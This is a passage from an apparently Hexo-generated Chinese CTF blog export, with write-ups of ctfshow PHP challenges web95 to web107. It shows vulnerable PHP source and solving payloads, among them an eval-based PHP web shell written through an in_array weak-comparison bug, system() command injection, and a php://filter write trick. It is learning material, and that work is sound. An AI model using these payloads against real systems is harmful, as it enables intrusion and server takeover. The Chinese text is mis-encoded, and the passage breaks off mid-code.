class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ëß£Á†ÅÂæóÂà∞flag<br><img src="https://img-blog.csdnimg.cn/5ffb75187dbc42149eb9443b38b8d876.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPÁâπÊÄß</title>
      <link href="/2023/04/07/PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2023/04/07/PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//‰∏çËÆ©Âá∫Áé∞Â≠óÊØç„Äêa-z„ÄëÂíåÁÇπ„Äê.„Äë„ÄÇ</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//Êü•ÁúãÊï∞Â≠ó‰∏≠ÊòØÂê¶Êúâ0Âá∫Áé∞ÔºåÁî±‰∫éÂºÄÂ§¥ÁöÑÈõ∂‰ºöÁúãÊàêÂÖ´ËøõÂà∂Ëß£Êûê„ÄÇ</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phpÁöÑintvalÂáΩÊï∞ÈªòËÆ§ÂÄºËΩ¨Êç¢ÊòØÂçÅËøõÂà∂ÔºåÂΩìÊï∞Â≠ó‰ª•0ÂºÄÂ§¥Êó∂‰ª•ÂÖ´ËøõÂà∂ËΩ¨Êç¢Ôºå‰ª•0xÂºÄÂ§¥Êó∂‰ª•ÂçÅÂÖ≠ËøõÂà∂ËΩ¨Êç¢„ÄÇ<br>Ëøô‰∏™È¢ò‰∏≠ÂèØ‰ª•‰ΩøÁî®ÂÖ´ËøõÂà∂Ôºà0ÂºÄÂ§¥ÔºâÁªïËøá,ÂçÅÂÖ≠ËøõÂà∂‰∏çË°åÔºà0xÂºÄÂ§¥Ôºâ„ÄÇ4476ËΩ¨Êç¢‰∏∫ÂÖ´ËøõÂà∂‰∏∫10574„ÄÇphp‰∏≠+ÂèØ‰ª•ÂΩì‰ΩúÁ©∫Ê†º‰ΩøÁî®„ÄÇ<br>?num&#x3D;+010574</p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">Notice: Undefined index: flag in /var/www/html/index.php on line 15Notice: Undefined index: flag in /var/www/html/index.php on line 16Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 21:39:27# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//Â¶ÇÊûúÂ≠òÂú®getÊñπÊ≥ï‰º†ÂÖ•ÂèÇÊï∞ÔºåÂ∞±Â∞Üget‰º†ÂÖ•ÂèÇÊï∞Âèò‰∏∫postÊñπÊ≥ï‰º†ÂÖ•ÂèÇÊï∞„ÄÇ</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//Ëã•get(flag)‰º†ÂÖ•ÁöÑflagÔºåcookieÂèò‰∏∫‚Äúflag‚Äù„ÄÇ</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//Ëã•get(flag)‰º†ÂÖ•ÁöÑflagÔºåSERVERÂèò‰∏∫‚Äúflag‚Äù„ÄÇ</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//get(HTTP_FLAG)‰º†ÂÖ•flagÔºåÂæóÂà∞flag.php</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ok,get‰º†ÂÖ•Èöè‰æø‰º†ÂèÇ<code>?1=3</code>post‰º†ÂÖ•<code>HTTP_FLAG=flag</code>„ÄÇÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/162ebf1159144b3c94f25788a35441d6.png" alt="1"></p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 22:36:12# @link: https://ctfer.com*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËÆæÁΩÆ‰∏∫Êï∞ÁªÑ</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//0x36d=877</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Â∞ÜÊï∞ÁªÑÂÜôÂÖ•$allowÔºàÈöèÊú∫Êï∞Ôºâ</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//ÂåπÈÖç‰º†ÂÖ•ÁöÑnÂÄºÊòØÂê¶Âú®$allow‰∏≠ÔºåÂ≠òÂú®ËøîÂõûtrue</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Â∞Üpost‰º†ÂèÇÔºàcontentÔºâÂÜôÂÖ•Êñá‰ª∂</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadÔºö<code>?n=1.php</code>in_arrayÂ≠òÂú®Âº±ÊØîËæÉÊºèÊ¥ûÔºå‰º†ÂÖ•1.php‰ºöÂà§Êñ≠‰∏∫1„ÄÇ<br>postÔºö<code>content=&lt;? eval($_POST[a]);?&gt;</code>Ôºå‰∏çË°åÁöÑËØùÂ§öËØïÂá†Ê¨°ÔºåÊØïÁ´üÊòØÈöèÊú∫ÂåπÈÖç„ÄÇ</p><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ê∂âÂèäÂà∞‰∏Ä‰∏™Áü•ËØÜÁÇπ<strong>ÈÄªËæëËøêÁÆóÁ¨¶</strong>ÔºåÂÜçÂ§ç‰π†‰∏Ä‰∏ãÔºö<br><img src="https://img-blog.csdnimg.cn/61e22c6d589646a29eedcc378991996f.png" alt="2"><br><strong>Ê≥ï‰∏Ä</strong><br>payload<code>?v1=1&amp;v2=system(&quot;ls&quot;)/*&amp;v3=;*/;</code><br><code>?v1=1&amp;v2=system(&quot;cat ctfshow*&quot;)/*&amp;v3=;*/;</code>Âè≥ÈîÆÊü•ÁúãÊ∫êÁ†Å<br><strong>Ê≥ï‰∫å</strong><br>ÈááÁî®<strong>phpÁöÑÂèçÂ∞ÑÁ±ªReflectionClass</strong><br><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br><img src="https://img-blog.csdnimg.cn/61af74a693254f7aa8822b5d01eb4015.png" alt="1"><br>ËÆ∞ÂæóÊää0x2dÊîπÊàê<code>-</code>ÔºåÊúÄÂêéÂÜçÂä†‰∏äctfshow{}„ÄÇ</p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>call_user_func</code>ÊòØ‰∏Ä‰∏™ÂÜÖÁΩÆÂáΩÊï∞ÔºåÂÆÉÂÖÅËÆ∏‰Ω†ÈÄöËøáÂáΩÊï∞ÂêçÂ≠óÁ¨¶‰∏≤Ë∞ÉÁî®‰∏Ä‰∏™ÂáΩÊï∞ÊàñÊñπÊ≥ï„ÄÇ<br>‰∏ãÈù¢ÊòØ‰∏Ä‰∏™‰ΩøÁî®call_user_funcË∞ÉÁî®‰∏Ä‰∏™ÂáΩÊï∞ÁöÑ‰æãÂ≠êÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">add</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span> <span class="token comment">// ËæìÂá∫ 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®Ëøô‰∏™‰æãÂ≠ê‰∏≠ÔºåÊàë‰ª¨‰ΩøÁî®call_user_funcÈÄöËøáÂáΩÊï∞ÂêçÂ≠óÁ¨¶‰∏≤‚Äôadd‚ÄôÊù•Ë∞ÉÁî®addÂáΩÊï∞ÔºåÂπ∂‰º†ÈÄí‰∫ÜÂèÇÊï∞2Âíå3„ÄÇ<strong>call_user_func</strong>ÊâßË°å‰∫Üadd(2, 3)ÔºåËøîÂõûÁªìÊûú5„ÄÇ</p><p>Èô§‰∫ÜÂáΩÊï∞ÂêçÂ≠óÁ¨¶‰∏≤‰πãÂ§ñÔºå$callbackËøòÂèØ‰ª•ÊòØ‰∏Ä‰∏™ÂåÖÂê´ÂØπË±°ÂíåÊñπÊ≥ïÂêçÁöÑÊï∞ÁªÑÔºåÊàñËÄÖÊòØ‰∏Ä‰∏™Èó≠ÂåÖ„ÄÇ<strong>call_user_func</strong>Âú®‰ΩøÁî®Ëøô‰∫õÁ±ªÂûãÁöÑÂõûË∞ÉÊó∂‰∏é‰ΩøÁî®ÂáΩÊï∞ÂêçÂ≠óÁ¨¶‰∏≤ÁöÑÊñπÂºèÊòØÁ±ª‰ººÁöÑ„ÄÇ<br><code>hex2bin() ÂáΩÊï∞</code>ÊääÂçÅÂÖ≠ËøõÂà∂ÂÄºËΩ¨Êç¢‰∏∫ ASCII Â≠óÁ¨¶<br><code>bin2hex()ÂáΩÊï∞</code>ÊääASCII Â≠óÁ¨¶ËΩ¨Êç¢‰∏∫ ÂçÅÂÖ≠ËøõÂà∂ÂÄº<br>Êú¨È¢ò‰∏≠‰º†ÂÖ•ÁöÑv1‰∏é$sÂú®ÂáΩÊï∞<code>call_user_func</code>‰∏≠‰ºöË∞ÉÁî®$s<br>v2Ë¶ÅÁ∫ØÊï∞Â≠óv3‰∏çÈôê</p><blockquote><p><strong>GET</strong><br>v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-<br>decode&#x2F;resource&#x3D;2.php<br><strong>POST</strong><br>v1&#x3D;hex2bin<br>#ËÆøÈóÆ2.phpÂêéÊü•ÁúãÊ∫ê‰ª£Á†ÅËé∑Âæóflag</p></blockquote><p><a href="https://blog.csdn.net/m0_62094846/article/details/122497198">ÂèÇËÄÉÈìæÊé•</a></p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'‰Ω†ËøòÊÉ≥Ë¶ÅflagÂòõÔºü'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'Êó¢ÁÑ∂‰Ω†ÊÉ≥Ë¶ÅÈÇ£Áªô‰Ω†ÂêßÔºÅ'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>foreachÂáΩÊï∞</code></p><blockquote><p>foreach Âæ™ÁéØÂè™ÈÄÇÁî®‰∫éÊï∞ÁªÑÔºåÂπ∂Áî®‰∫éÈÅçÂéÜÊï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏™ÈîÆ&#x2F;ÂÄºÂØπ„ÄÇ<br><code>foreach ($array as $value)</code></p></blockquote><blockquote><p><code>die() ÂáΩÊï∞</code>ËæìÂá∫‰∏ÄÊù°Ê∂àÊÅØÔºåÂπ∂ÈÄÄÂá∫ÂΩìÂâçËÑöÊú¨„ÄÇ</p></blockquote><p>ÊØèËøõË°å‰∏ÄÊ¨°Âæ™ÁéØËø≠‰ª£ÔºåÂΩìÂâçÊï∞ÁªÑÂÖÉÁ¥†ÁöÑÂÄºÂ∞±‰ºöË¢´ËµãÂÄºÁªô $value ÂèòÈáèÔºåÂπ∂‰∏îÊï∞ÁªÑÊåáÈíà‰ºöÈÄê‰∏ÄÂú∞ÁßªÂä®ÔºåÁõ¥Âà∞Âà∞ËææÊúÄÂêé‰∏Ä‰∏™Êï∞ÁªÑÂÖÉÁ¥†„ÄÇ<br>get‰º†ÂÖ•‰∏Ä‰∏™ÂÄºÔºåÊääÂÄºËµãÁªôkeyÔºåÂ¶ÇÊûúkey&#x3D;&#x3D;=errorËæìÂá∫‚Äùwhat are you doing?!‚ÄúÂÅúÊ≠¢ÂáΩÊï∞„ÄÇÂê¶ÂàôÊääÂÄºËµãÁªôvalue<br>post‰º†ÂÖ•‰∏Ä‰∏™ÂÄºÔºåÊääÂÄºËµãÁªôkeyÔºåÂ¶ÇÊûúkey&#x3D;&#x3D;=flagËæìÂá∫‚Äùwhat are you doing?!‚ÄúÂÅúÊ≠¢ÂáΩÊï∞„ÄÇÂê¶ÂàôÊääÂÄºËµãÁªôvalue<br>Â¶ÇÊûúpost‰º†ÂÖ•ÁöÑflag‰∏é$flagÁõ∏Á≠â„ÄÇÁªôÊàë‰ª¨flag<br>payload:</p><blockquote><p>GET:<br>?x&#x3D;flag<br>POST:<br>error&#x3D;x</p></blockquote><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token 